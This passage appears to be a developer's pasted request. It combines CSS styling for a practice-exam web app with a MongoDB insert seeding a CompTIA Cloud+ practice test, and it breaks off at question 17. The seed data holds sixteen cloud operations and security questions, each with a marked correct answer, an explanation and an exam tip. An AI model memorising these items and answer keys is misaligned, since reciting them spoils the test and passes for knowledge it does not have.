+  background: rgba(255, 255, 255, 0.15);
+  color: var(--test-text);
+}
+
+.review-score-line {
+  font-size: 16px;
+  margin: 0 0 20px 0;
+  color: var(--test-text-secondary);
+}
+
+.review-filter-buttons {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 10px;
+  margin-bottom: 20px;
+  justify-content: center;
+}
+
+.review-filter-buttons button {
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid var(--test-border);
+  color: var(--test-text);
+  padding: 8px 15px;
+  border-radius: 6px;
+  font-family: inherit;
+  font-size: 14px;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+
+.review-filter-buttons button:hover {
+  background: rgba(255, 255, 255, 0.1);
+}
+
+.review-filter-buttons button.active-filter {
+  background: var(--test-accent);
+  color: white;
+  border-color: var(--test-accent);
+}
+
+.review-mode-container {
+  display: flex;
+  flex-direction: column;
+  gap: 15px;
+  margin-top: 20px;
+}
+
+.review-question-card {
+  background: rgba(0, 0, 0, 0.2);
+  border: 1px solid var(--test-border);
+  border-radius: 10px;
+  padding: 20px;
+  font-family: 'Open Sans', sans-serif
+}
+
+.review-question-card h3 {
+  margin: 0 0 15px 0;
+  font-size: 16px;
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  font-family: 'Open Sans', sans-serif
+}
+
+.flagged-icon {
+  color: var(--test-warning);
+}
+
+.review-question-card p {
+  margin: 0 0 10px 0;
+  font-size: 1rem;
+  line-height: 1.5;
+  font-family: 'Open Sans', sans-serif;
+}
+
+.review-question-card p:last-child {
+  margin-bottom: 0;
+  padding-top: 10px;
+  border-top: 1px solid var(--test-border);
+  font-family: 'Open Sans', sans-serif;
+  font-size: 1.2rem;
+}
+
+.close-review-btn {
+  margin-top: 20px;
+}
+
+/* Test Length Selector Screen */
+.test-length-selector {
+  background: var(--test-bg-card);
+  border-radius: 15px;
+  border: 1px solid var(--test-border);
+  padding: 30px;
+  width: 90%;
+  max-width: 500px;
+  margin: 60px auto;
+  text-align: center;
+  box-shadow: var(--test-shadow);
+  animation: fadeInUp 0.5s ease;
+}
+
+.test-length-selector h2 {
+  font-size: 24px;
+  margin: 0 0 15px 0;
+  background: var(--test-gradient-primary);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  font-weight: 700;
+}
+
+.test-length-selector p {
+  font-size: 16px;
+  margin-bottom: 25px;
+  color: var(--test-text-secondary);
+}
+
+.test-length-options {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+  gap: 15px;
+  margin-bottom: 30px;
+}
+
+.test-length-selector label {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid var(--test-border);
+  padding: 12px 20px;
+  border-radius: 8px;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+
+.test-length-selector label:hover {
+  background: rgba(255, 255, 255, 0.1);
+}
+
+.test-length-selector input[type="radio"] {
+  accent-color: var(--test-accent);
+}
+
+.test-length-selector button {
+  background: var(--test-gradient-primary);
+  color: white;
+  border: none;
+  padding: 12px 30px;
+  border-radius: 8px;
+  font-family: inherit;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+
+.test-length-selector button:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 4px 15px rgba(101, 67, 204, 0.3);
+}
+
+/* Level Up Overlay Animation for Confetti */
+@keyframes fadeInUp {
+  from {
+    opacity: 0;
+    transform: translateY(20px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+
+/* Exam Tip Section */
+.exam-tip {
+  background: rgba(255, 193, 7, 0.1);
+  border: 1px solid var(--test-border);
+  border-left: 4px solid var(--test-warning);
+  border-radius: 8px;
+  padding: 15px;
+  margin-top: 15px;
+  margin-bottom: 25px;
+  animation: fadeIn 0.3s ease;
+  font-family: 'Open Sans', sans-serif;
+}
+
+.exam-tip strong {
+  display: flex;
+  align-items: center;
+  margin-bottom: 10px;
+  font-size: 17px;
+  color: var(--test-warning);
+  font-family: 'Open Sans', sans-serif;
+}
+
+.exam-tip-icon {
+  margin-right: 8px;
+}
+
+.exam-tip p {
+  margin: 0;
+  font-size: 16px;
+  line-height: 1.6;
+  color: var(--test-text-secondary);
+  font-family: 'Open Sans', sans-serif;
+  font-style: italic;
+}
+
+
+/* Responsive Styles */
+@media (max-width: 768px) {
+  .aplus-test-container {
+    padding: 15px;
+  }
+  
+  .aplus-title {
+    font-size: 24px;
+  }
+  
+  .top-bar, 
+  .top-control-bar {
+    flex-direction: column;
+    gap: 10px;
+    align-items: stretch;
+  }
+  
+  .avatar-section-test {
+    justify-content: center;
+  }
+  
+  .xp-level-display,
+  .coins-display {
+    text-align: center;
+  }
+  
+  .question-dropdown {
+    width: 100%;
+  }
+  
+  .bottom-control-row {
+    flex-direction: column;
+  }
+  
+  .prev-question-btn,
+  .next-question-btn,
+  .skip-question-btn {
+    max-width: none;
+  }
+  
+  .overlay-buttons {
+    flex-direction: column;
+  }
+  
+  .restart-button,
+  .review-button,
+  .back-btn,
+  .next-test-button {
+    width: 100%;
+  }
+  
+  .testlist-card-actions.two-buttons {
+    flex-direction: column;
+  }
+  
+  .testlist-mode-toggle {
+    width: 100%;
+    justify-content: space-between;
+  }
+  
+  .review-filter-buttons {
+    flex-direction: row;
+    overflow-x: auto;
+    padding-bottom: 5px;
+    scrollbar-width: none;
+  }
+  
+  .review-filter-buttons::-webkit-scrollbar {
+    display: none;
+  }
+   
+  .exam-tip {
+    padding: 12px;
+    margin-top: 12px;
+    margin-bottom: 20px;
+  }
+  
+  .exam-tip strong {
+    font-size: 16px;
+    margin-bottom: 8px;
+  }
+  
+  .exam-tip p {
+    font-size: 15px;
+    line-height: 1.5;
+  }
+}
+
+@media (max-width: 480px) {
+  .aplus-test-container,
+  .testlist-container {
+    padding: 10px;
+  }
+  
+  .aplus-title {
+    font-size: 20px;
+  }
+  
+  .question-text {
+    font-size: 16px;
+  }
+  
+  .option-button {
+    font-size: 14px;
+    padding: 12px;
+  }
+  
+  .score-content,
+  .confirm-popup-content,
+  .testlist-popup {
+    padding: 20px;
+  }
+  
+  .score-title {
+    font-size: 24px;
+  }
+  
+  .score-details {
+    font-size: 16px;
+  }
+  
+  .testlist-header {
+    padding: 15px;
+  }
+  
+  .testlist-title {
+    font-size: 24px;
+  }
+  
+  .testlist-card-header {
+    padding: 12px 15px;
+  }
+  
+  .testlist-card-content {
+    padding: 15px;
+  }
+  
+  .testlist-card-number {
+    font-size: 16px;
+  }
+  
+  .testlist-difficulty {
+    font-size: 11px;
+    padding: 3px 8px;
+  }
+   
+  .exam-tip {
+    padding: 12px;
+    margin-top: 12px;
+    margin-bottom: 20px;
+  }
+  
+  .exam-tip strong {
+    font-size: 15px;
+    margin-bottom: 8px;
+  }
+  
+  .exam-tip p {
+    font-size: 14px;
+    line-height: 1.5;
+  }
+}
+/* Special Fixes for very small screens */
+@media (max-width: 360px) {
+  .aplus-title {
+    font-size: 18px;
+  }
+  
+  .avatar-image {
+    width: 40px;
+    height: 40px;
+  }
+  
+  .testlist-length-options {
+    flex-direction: column;
+  }
+  
+  .testlist-popup-actions {
+    flex-direction: column;
+    gap: 10px;
+  }
+  
+  .review-question-card {
+    padding: 15px;
+  }
+}
+
+
+here is a full exmaple a test i have with very in depth/techinal pBQ style liek with real code/graph/chart/ip address etc etc erct and is porbaly the best exampel of what i said above about all the stuff taht doesnt show right- and also exmaples of how they appesar now pictures are provided
+
+
+db.tests.insertOne({
+  "category": "cloudplus",
+  "testId": 10,
+  "testName": "CompTIA Cloud+ (CV0-004) Practice Test #10 (Ultra Level)",
+  "xpPerCorrect": 10,
+  "questions": [
+    {
+      "id": 1,
+      "question": "A cloud engineer configures a multi-tier application in a VPC with web, application, and database servers. During testing, the database server experiences excessive CPU utilization when the application scales beyond 50 concurrent users. System logs show multiple connection establishments per user request. Which solution addresses the root cause of this issue?",
+      "options": [
+        "Implement connection pooling in the application tier to reuse existing database connections",
+        "Migrate the database to a larger instance type with higher CPU allocation",
+        "Configure auto-scaling for the database tier based on CPU utilization metrics",
+        "Implement database query caching to reduce computational overhead"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "The root cause of this issue is excessive database connection establishment, evidenced by the system logs showing multiple connection establishments per user request. Creating and tearing down database connections is a CPU-intensive operation. Implementing connection pooling in the application tier addresses this by maintaining a pool of persistent connections that can be reused across requests, eliminating the overhead of repeatedly establishing and terminating connections as user count increases. Migrating to a larger instance type would temporarily alleviate symptoms but doesn't address the inefficient connection handling that's causing the problem. Configuring auto-scaling for the database tier would add more resources when CPU utilization increases, but again doesn't solve the underlying connection inefficiency. Database query caching would reduce computational load for repetitive queries but wouldn't address the connection establishment overhead that's explicitly mentioned in the logs.",
+      "examTip": "When troubleshooting database performance issues, analyze connection patterns first—excessive connection creation often causes more CPU overhead than query execution itself, particularly as user count increases."
+    },
+    {
+      "id": 2,
+      "question": "An organization deploys a new version of their API service using a canary deployment strategy. Monitoring shows a 15% increase in HTTP 500 errors for the canary version, but only during periods of high traffic. Logs indicate that some database queries time out when concurrent requests exceed a specific threshold. How should the engineer troubleshoot this issue?",
+      "options": [
+        "Roll back the deployment immediately and revert to the previous stable version",
+        "Increase the timeout value for database queries in the API configuration",
+        "Capture and analyze database execution plans during high traffic periods to identify inefficient queries",
+        "Scale the database horizontally to handle the increased query load"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "The error pattern suggests that the issue occurs only during high traffic periods and manifests as database query timeouts, indicating a potential performance regression in the new version's database interactions. Capturing and analyzing database execution plans during high traffic periods would identify specific queries that have become inefficient in the new version, pinpointing the exact cause of the timeouts when concurrency reaches the threshold. Rolling back immediately would resolve symptoms but misses the opportunity to identify and fix the root cause, which would likely recur in future releases. Increasing timeout values would mask the problem rather than solving it, potentially leading to resource exhaustion as slow queries accumulate. Scaling the database horizontally might temporarily alleviate symptoms but without addressing the underlying query inefficiency, which should be identified and optimized first before considering resource scaling.",
+      "examTip": "For intermittent performance issues that only occur under specific load conditions, always capture diagnostic data (like query plans) during the problematic state before considering scaling or rollback decisions."
+    },
+    {
+      "id": 3,
+      "question": "A cloud architect is designing an application's resilience strategy to ensure it meets a defined RTO of 10 minutes and RPO of 5 minutes across all components. The data analytics module contains a distributed database that replicates asynchronously across availability zones with a current lag time of 15 minutes during peak processing. What architectural change should be implemented to meet the defined objectives?",
+      "options": [
+        "Convert the database replication mode from asynchronous to synchronous",
+        "Implement cache warming to prepare standby compute resources before failover",
+        "Configure automated DNS failover to redirect traffic during outages",
+        "Deploy the analytics module in active-active configuration across multiple regions"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "The critical issue preventing the application from meeting its RPO of 5 minutes is the database replication lag of 15 minutes, which would result in up to 15 minutes of data loss during a failover event. Converting the replication mode from asynchronous to synchronous ensures that transactions are committed on all replicas before acknowledging completion, effectively reducing the potential data loss to zero and meeting the 5-minute RPO requirement. Cache warming would help meet the RTO by reducing startup time for replacement components but doesn't address the data replication lag affecting the RPO. Automated DNS failover impacts recovery time (RTO) but doesn't affect the amount of data that could be lost due to replication lag (RPO). Active-active configuration across regions would improve availability but wouldn't necessarily address the replication lag unless the replication methodology was also changed from asynchronous to synchronous.",
+      "examTip": "When addressing RPO requirements, focus on data replication methodologies and their consistency guarantees—synchronous replication reduces potential data loss but may impact performance, while asynchronous replication improves performance but increases potential data loss during failures."
+    },
+    {
+      "id": 4,
+      "question": "A cloud administrator needs to implement a secure solution for allowing temporary administrative access to database servers in a production environment. The solution must enforce least privilege, provide detailed audit logs, and automatically revoke access after use. Identify the most secure implementation.",
+      "options": [
+        "Create IAM roles with escalated privileges and allow developers to assume the role when needed with a session timeout",
+        "Implement a privileged access management system that provides time-limited, approval-based credential checkout with session recording",
+        "Configure database users with administrative access and rotate credentials after each use through an automated script",
+        "Deploy bastion hosts with restricted SSH access and IP-based filtering for administrative connections"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "A privileged access management (PAM) system provides comprehensive security for temporary administrative access by implementing a secure credential checkout process with approval workflows, ensuring access is granted only when necessary. PAM systems provide detailed session recording for audit purposes, automatically revoke access after a defined period, and many implement just-in-time privilege elevation. This approach satisfies all requirements: least privilege through time-limited, purpose-specific access; detailed audit logs through session recording; and automatic access revocation. IAM roles with session timeouts provide temporary access but lack the approval workflows and detailed session recording that PAM systems offer. Rotating database credentials after each use could work but lacks the automated time limitation and detailed session auditing capabilities. Bastion hosts with IP filtering provide a access point but don't inherently implement automated access revocation or detailed session auditing.",
+      "examTip": "For temporary administrative access scenarios, prioritize solutions that combine approval workflows, just-in-time privilege elevation, session recording, and automatic revocation to minimize standing privileges while maintaining comprehensive audit trails."
+    },
+    {
+      "id": 5,
+      "question": "During a security assessment of a cloud deployment, the penetration testing team identifies that several VM instances in a cloud environment are vulnerable to a recently disclosed CPU microarchitecture vulnerability. These VMs run critical applications that cannot be patched immediately due to compatibility testing requirements. Which temporary mitigation should be implemented to reduce the risk while maintaining application availability?",
+      "options": [
+        "Enable VM shielding technology that provides memory encryption and integrity verification",
+        "Implement virtual machine instance isolation using dedicated hosts with CPU pinning",
+        "Deploy a web application firewall to filter potentially malicious traffic targeting the vulnerability",
+        "Create a VM snapshot before patching and restore if compatibility issues arise"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "CPU microarchitecture vulnerabilities typically exploit shared hardware resources between virtual machines to leak sensitive information across security boundaries. Implementing virtual machine instance isolation using dedicated hosts with CPU pinning mitigates this risk by ensuring the vulnerable VMs run on dedicated physical hardware without sharing CPU cores with other potentially malicious tenants. This approach provides effective isolation from cross-VM attacks until proper patching can be completed. VM shielding with memory encryption would help with some attacks but may not fully address all CPU microarchitecture vulnerabilities that target cache timing or speculative execution. A web application firewall operates at the application layer and cannot effectively mitigate hardware-level vulnerabilities in the CPU architecture. Creating a VM snapshot before patching is a recovery strategy rather than a mitigation and doesn't reduce the current vulnerability exposure.",
+      "examTip": "For hardware-level vulnerabilities like CPU microarchitecture flaws, focus first on physical isolation techniques when immediate patching isn't possible, as these vulnerabilities often exploit shared hardware resources rather than software flaws that security appliances can address."
+    },
+    {
+      "id": 6,
+      "question": "A development team is deploying a new application that uses a microservices architecture with Kubernetes. During performance testing, they observe that while individual service response times are within acceptable limits, end-to-end transaction latency occasionally spikes significantly. The monitoring dashboard shows no resource constraints on any pod. Analyze the scenario and identify the most likely cause of the latency spikes.",
+      "options": [
+        "Network policy rules creating intermittent connection delays between services",
+        "Insufficient horizontal pod autoscaling parameters causing transient resource contention",
+        "Container image pulling during pod creation causing scheduling delays",
+        "Improper circuit breaking implementation causing cascading timeout delays"
+      ],
+      "correctAnswerIndex": 3,
+      "explanation": "The scenario indicates a system where individual services perform well (no resource constraints on any pod), but end-to-end transactions occasionally experience high latency. This pattern suggests a failure cascade situation where a slower dependency causes other services to wait until they timeout. An improper circuit breaking implementation fails to detect and quickly fail when dependent services become unresponsive, causing requests to wait for their full timeout period rather than failing fast. This creates cascading delays that affect overall transaction time while individual service metrics remain acceptable. Network policy rules would typically cause consistent connection issues rather than occasional spikes. Insufficient horizontal pod autoscaling would manifest as resource constraints on pods, which monitoring shows is not occurring. Container image pulling during pod creation would affect deployment time but not ongoing transaction latency once pods are running.",
+      "examTip": "In microservices architectures, look beyond individual service performance metrics—latency spikes in end-to-end transactions despite healthy individual services often indicate resilience issues like missing circuit breakers, timeout misconfigurations, or ineffective fallback mechanisms."
+    },
+    {
+      "id": 7,
+      "question": "A cloud infrastructure team has implemented infrastructure as code using HashiCorp Terraform. During a routine update, they observe that the Terraform apply operation is marking several resources for replacement rather than in-place update, which would cause application downtime. Upon investigation, the team notices that some configuration values specified in the code don't match the actual deployed values in the cloud environment. What is the most likely explanation for this configuration drift?",
+      "options": [
+        "The state file was corrupted during a previous failed operation",
+        "Team members made manual changes to resources through the cloud provider console",
+        "The cloud provider API returning inconsistent values compared to the actual resources",
+        "Terraform modules were updated without running initialization before applying changes"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "Configuration drift between the Terraform state and actual cloud resources most commonly occurs when manual changes are made directly to resources through the cloud provider console or API outside of the Terraform workflow. When Terraform subsequently runs, it compares the desired state in code with the current state in its state file, but when it verifies the actual resource properties, it discovers differences that were not recorded in its state. This forces Terraform to recreate resources to match the code-defined state. State file corruption usually prevents Terraform from running properly rather than causing specific resources to be marked for replacement. Cloud provider APIs occasionally return transient errors but rarely persistent inconsistent values across multiple resources. Updating modules without re-initialization would typically result in errors about missing providers or modules rather than configuration drift.",
+      "examTip": "When troubleshooting unexpected resource replacements in infrastructure as code deployments, first investigate whether manual changes have been made outside the IaC workflow—this is the most common cause of state drift that leads to unnecessary resource recreation."
+    },
+    {
+      "id": 8,
+      "question": "A DevOps engineer is investigating a failed deployment that occurred during off-hours through the CI/CD pipeline. The pipeline logs show that the infrastructure deployment completed successfully, but the subsequent application deployment failed with connection timeout errors when attempting to reach the database. Previous deployments using the same configuration worked correctly. What is the most likely cause of this issue?",
+      "options": [
+        "The database security group rules changed due to a security policy update",
+        "The application deployment timeout was too short for nighttime processing patterns",
+        "The connection string environment variables weren't properly injected during deployment",
+        "Database maintenance automation started during the deployment window"
+      ],
+      "correctAnswerIndex": 3,
+      "explanation": "The scenario indicates a deployment that previously worked correctly but failed specifically during off-hours with database connection timeout errors. This timing-specific failure strongly suggests scheduled database maintenance automation that coincided with the deployment window. Many organizations schedule database maintenance operations (backups, index rebuilding, patching) during off-hours when user traffic is lowest. These operations can temporarily impact database connectivity or performance. The security group rule changes would likely affect all deployments, not just off-hours ones. A too-short deployment timeout would manifest as a deployment process timeout, not as connection timeouts to the database. Missing connection string variables would typically result in immediate connection failures with different error messages (e.g., invalid connection string) rather than timeout errors that indicate the system is trying to connect but not receiving a response.",
+      "examTip": "When deployments fail inconsistently based on time of day or day of week, investigate scheduled maintenance operations or automation that might coincide with these times before assuming configuration issues in the deployment itself."
+    },
+    {
+      "id": 9,
+      "question": "An organization is implementing a multi-account strategy in AWS. They need to enforce consistent security controls across all accounts while allowing department-specific customization. They've created an organizational structure with Security, SharedServices, and departmental organizational units. Which combination of AWS services and configurations will ensure baseline security standards while permitting necessary flexibility?",
+      "options": [
+        "AWS Config with organization-wide conformance packs and account-level remediation actions",
+        "AWS CloudTrail with organization trail and department-specific event selectors",
+        "Service Control Policies with preventative guardrails at the organization root and permission boundaries in department accounts",
+        "IAM Access Analyzer with organization-wide reporting and custom Security Hub standards"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Service Control Policies (SCPs) with preventative guardrails at the organization root combined with permission boundaries in department accounts provides the most effective approach for enforcing consistent security controls while allowing department-specific customization. SCPs at the organization root act as preventative guardrails that cannot be exceeded by any account, ensuring baseline security compliance across the organization. Permission boundaries in department accounts then allow departments to delegate permissions within their accounts up to, but not exceeding, the limits defined by these boundaries. This creates a two-layer approach that enforces organization-wide security requirements while providing department-level flexibility. AWS Config with conformance packs is detective rather than preventative, identifying non-compliance after it occurs rather than preventing it. CloudTrail with organization trails provides logging but doesn't directly enforce security controls. IAM Access Analyzer identifies resource access issues but doesn't provide the comprehensive preventative controls that SCPs offer.",
+      "examTip": "When implementing hierarchical security controls in multi-account cloud environments, combine organization-wide preventative guardrails that cannot be bypassed (like SCPs) with account-level delegation mechanisms (like permission boundaries) to balance consistent security with operational flexibility."
+    },
+    {
+      "id": 10,
+      "question": "A cloud administrator is analyzing the organization's virtual network architecture and notices that a web application is experiencing intermittent performance issues. Network monitoring shows consistent latency but occasional packet drops between the application and database tiers during peak traffic periods. Both tiers scale horizontally based on CPU utilization, with the current configuration shown below:\n\n- Web tier: Auto-scaling group, min:4, max:10, current:8 instances\n- Database tier: Auto-scaling group, min:2, max:6, current:4 instances\n- Network: Security groups allow necessary traffic, MTU set to standard 1500\n\nWhich configuration change will most effectively address the packet loss issue?",
+      "options": [
+        "Modify the database scaling policy to scale based on connection count rather than CPU utilization",
+        "Implement connection draining on the web tier to gracefully handle instance termination",
+        "Configure jumbo frames (MTU 9001) for the network path between application and database tiers",
+        "Implement network ACLs to prioritize database traffic during congestion periods"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "The scenario describes a system where packet drops occur specifically during peak traffic periods between the application and database tiers, despite both tiers scaling based on CPU utilization. This strongly suggests that the database tier is experiencing connection saturation before CPU constraints become apparent. Modifying the database scaling policy to scale based on connection count rather than CPU utilization would ensure that the database tier scales appropriately to handle incoming connection load before network issues occur. Connection draining would help during scale-in operations but wouldn't address packet loss during peak traffic when scale-out is more relevant. Configuring jumbo frames could improve throughput but wouldn't specifically address packet drops due to connection saturation. Network ACLs for traffic prioritization might help if the issue were congestion on shared network paths, but the description points more specifically to capacity limitations at the database tier rather than general network congestion.",
+      "examTip": "When troubleshooting scaling-related network issues, analyze whether your scaling metrics actually reflect the resource constraint causing the problem—CPU utilization scaling may miss bottlenecks in network connections, memory, or disk I/O that manifest before CPU becomes constrained."
+    },
+    {
+      "id": 11,
+      "question": "A cloud architect needs to design a network architecture for a new application being migrated to the cloud. The application consists of web, application, and database tiers, with strict security requirements for PCI DSS compliance. The architect must ensure proper network segmentation while minimizing administrative overhead. Which network architecture meets these requirements?",
+      "options": [
+        "Single VPC with public and private subnets, using security groups for tier isolation",
+        "Three separate VPCs for each tier with VPC peering connections between them",
+        "Single VPC with separate subnet tiers and network ACLs filtering traffic between tiers",
+        "Transit gateway connecting isolated VPCs with centralized routing policies"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "A single VPC with separate subnet tiers and network ACLs filtering traffic between tiers provides the most appropriate balance of security segmentation and administrative simplicity for PCI DSS compliance. This architecture creates clear network boundaries between each application tier through separate subnets, while network ACLs provide stateless filtering between subnets, enforcing strict tier-to-tier communication rules. PCI DSS specifically requires network segmentation between systems that process cardholder data and those that don't, which this design efficiently achieves. Using a single VPC with only security groups provides logical but not network-level segmentation, which may be insufficient for strict PCI requirements. Three separate VPCs with peering would create stronger isolation but significantly increases administrative overhead for managing multiple VPCs, complicates shared services, and requires more complex peering configurations. A transit gateway with isolated VPCs adds unnecessary complexity and cost for an application that can be properly segmented within a single VPC.",
+      "examTip": "When designing cloud network architectures for compliance frameworks like PCI DSS, balance security segmentation requirements against operational complexity—often a single VPC with well-designed subnet tiers and layered security controls (NACLs and security groups) provides sufficient isolation with manageable overhead."
+    },
+    {
+      "id": 12,
+      "question": "A cloud engineer is investigating performance issues with a distributed application deployed across multiple availability zones. The application uses a message queue for asynchronous processing, and users report that during peak periods, operations appear to succeed but the expected results don't appear until much later. Monitoring shows the following metrics:\n\n- API response times: Normal (avg 120ms)\n- Message queue depth: Increasing during peak hours (up to 20,000 messages)\n- Message consumer instances: Scaled to maximum (20 instances)\n- Consumer CPU utilization: Moderate (40-60%)\n- Database IOPS: Within limits (70% of provisioned)\n\nWhat is causing the processing delay based on these metrics?",
+      "options": [
+        "Insufficient consumer instances to process the incoming message volume",
+        "Database write throttling causing consumer message processing to slow down",
+        "Network latency between availability zones affecting message delivery",
+        "Inefficient message processing code in the consumer service"
+      ],
+      "correctAnswerIndex": 3,
+      "explanation": "The metrics indicate that message consumers have scaled to their maximum count but are processing messages inefficiently despite having available CPU capacity. The queue depth increases during peak periods while consumer CPU utilization remains only moderate (40-60%), suggesting that the consumers aren't CPU-bound. If consumers were efficiently processing messages, they would either keep the queue depth stable or show higher CPU utilization. This points to inefficient message processing code that isn't fully utilizing the available CPU resources, creating a bottleneck. Insufficient consumer instances would manifest as consumers running at high CPU utilization (near 100%) while failing to keep up with the queue. Database throttling would show as high IOPS utilization near provisioned limits, but the metrics show only 70% utilization. Network latency between availability zones would typically affect API response times as well, not just asynchronous processing, but API response times are reported as normal.",
+      "examTip": "When troubleshooting processing delays in distributed systems, examine resource utilization alongside queue depths—if queues are backing up while resources show moderate utilization, the issue is likely processing efficiency rather than resource capacity."
+    },
+    {
+      "id": 13,
+      "question": "A security team conducted a penetration test of a cloud environment and identified several vulnerabilities. The team lead asks how to prioritize remediation efforts. Given the following vulnerabilities, which should be addressed first based on potential business impact and exploitability?",
+      "options": [
+        "Unpatched operating system vulnerability (CVE-2021-3156) on internal admin server with CVSS score 7.8",
+        "Sensitive customer data stored unencrypted in object storage with default ACL permissions",
+        "Overly permissive IAM role allowing EC2 instances to call any API in the account",
+        "Missing web application firewall on public-facing load balancer with no evidence of active attacks"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "The overly permissive IAM role allowing EC2 instances to call any API in the account presents the highest risk and should be addressed first. This configuration creates an extensive privilege escalation path that could allow an attacker who compromises any EC2 instance to gain complete control over the entire AWS account, potentially affecting all services and data. The impact scope is entire account compromise and requires no special exploitation techniques beyond gaining access to the EC2 instance role credentials, which are automatically available to any code running on the instance. The unpatched OS vulnerability on an internal admin server is serious but has a more limited blast radius and requires direct access to the server. Unencrypted sensitive data in object storage is a compliance and data protection issue but requires an attacker to first gain object storage access. A missing WAF on a public-facing load balancer is a defense-in-depth control, but the description notes no evidence of active attacks, suggesting lower immediate risk compared to the privilege escalation path.",
+      "examTip": "When prioritizing security vulnerabilities in cloud environments, evaluate both the potential access scope (account-wide vs. single resource) and the exploitation difficulty—overly permissive identity permissions often create the most dangerous attack paths because they amplify the impact of any initial compromise."
+    },
+    {
+      "id": 14,
+      "question": "An organization uses AWS CloudFormation for infrastructure deployment. Their template includes the following snippet for a security group:\n\n```yaml\nWebServerSecurityGroup:\n  Type: 'AWS::EC2::SecurityGroup'\n  Properties:\n    GroupDescription: Enable HTTP access\n    SecurityGroupIngress:\n      - IpProtocol: tcp\n        FromPort: 80\n        ToPort: 80\n        CidrIp: 0.0.0.0/0\n```\n\nWhich modification would improve the security posture while still allowing necessary functionality?",
+      "options": [
+        "Replace 0.0.0.0/0 with the organization's office IP range to restrict access",
+        "Add a security group egress rule restricting outbound traffic to only necessary destinations",
+        "Modify the security group to use a security group ID reference instead of a CIDR range",
+        "Add AWS::WAF::WebACL resource and associate it with the web server security group"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "The current security group configuration allows HTTP access (port 80) from any IP address on the internet (0.0.0.0/0), which creates an unnecessarily broad attack surface. Replacing this with the organization's office IP range restricts access to legitimate users coming from corporate networks while still allowing necessary functionality. This implements the principle of least privilege by limiting inbound traffic to only known, trusted source IP ranges. Adding an egress rule would restrict outbound traffic but wouldn't address the overly permissive inbound access, which is the primary security concern in the provided configuration. Using a security group ID reference would change the mechanism of access control from IP-based to instance-based but wouldn't necessarily improve security since the source security group could still have overly permissive settings. Adding a WAF WebACL is a separate security control that can't be directly associated with a security group in CloudFormation—WAFs apply to load balancers, API gateways, or CloudFront distributions, not directly to security groups.",
+      "examTip": "When reviewing infrastructure as code for security, identify resources exposed to the internet (0.0.0.0/0) and assess whether this broad access is actually required—often limiting to specific IP ranges or VPCs significantly improves security posture without impacting legitimate functionality."
+    },
+    {
+      "id": 15,
+      "question": "A cloud operations team manages a complex environment with multiple services deployed across different cloud providers. They want to implement a unified monitoring solution that provides visibility across all environments. Which combination of components should be implemented to achieve comprehensive observability?",
+      "options": [
+        "Log aggregation, metrics collection, and synthetic transactions",
+        "Infrastructure monitoring, application performance monitoring, and status pages",
+        "Distributed tracing, metrics with dimensional data, and structured logging with correlation IDs",
+        "Alert management, dashboard visualization, and automated runbooks"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Distributed tracing, metrics with dimensional data, and structured logging with correlation IDs provide the most comprehensive observability solution for complex multi-cloud environments. Distributed tracing follows requests as they travel across service boundaries and between different environments, essential for understanding request flow in distributed systems. Metrics with dimensional data enable flexible analysis across various attributes and aggregations without predefined schemas. Structured logging with correlation IDs connects logs to traces and metrics, providing context for events and enabling root cause analysis across system boundaries. Together, these form the three pillars of observability (traces, metrics, logs) with the necessary correlation between them. Log aggregation and metrics collection are important but lack the context that distributed tracing provides. Infrastructure and application monitoring focus on specific layers rather than end-to-end visibility. Alert management and dashboards are visualization and notification tools but don't provide the underlying data collection necessary for observability.",
+      "examTip": "For observability in complex multi-cloud environments, implement solutions that not only collect data (logs, metrics) but also establish relationships between that data across service boundaries—correlation IDs and distributed tracing are essential for maintaining context in distributed systems."
+    },
+    {
+      "id": 16,
+      "question": "A company is designing their cloud network to connect multiple VPCs across different AWS regions. They need to ensure communication between workloads while isolating production and development environments. The solution must scale to potentially dozens of VPCs and provide centralized control. Examine the following configurations and determine which meets the requirements with minimal administrative overhead:",
+      "options": [
+        "VPC peering connections between all VPCs with network ACLs filtering cross-environment traffic",
+        "AWS Transit Gateway in each region with inter-region VPN connections and route table segmentation",
+        "Direct Connect gateways with private virtual interfaces to each VPC",
+        "VPC sharing from a central network account with resource access manager"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "AWS Transit Gateway in each region with inter-region VPN connections and route table segmentation is the most suitable solution for connecting multiple VPCs across regions while maintaining isolation and centralized control. Transit Gateway serves as a network hub to connect multiple VPCs, simplifying the network architecture by eliminating the need for complex peering relationships. Route table segmentation within Transit Gateway enables logical isolation between production and development environments. Inter-region VPN connections establish secure connectivity between Transit Gateways in different regions. This approach scales efficiently to dozens of VPCs without creating a mesh of connections and provides centralized visibility and control. VPC peering would require a full mesh of connections (n*(n-1)/2) as the number of VPCs grows, creating significant administrative overhead. Direct Connect gateways provide dedicated connectivity but are primarily for connecting on-premises networks to AWS, not for VPC-to-VPC communication. VPC sharing allows sharing subnets but only works within a single region, not across regions as required.",
+      "examTip": "When designing multi-VPC networking that needs to scale to many VPCs, avoid full-mesh peering architectures and instead implement hub-and-spoke models using transit gateways or similar services that provide centralized connection points with logical traffic segmentation."
+    },
+    {
+      "id": 17,
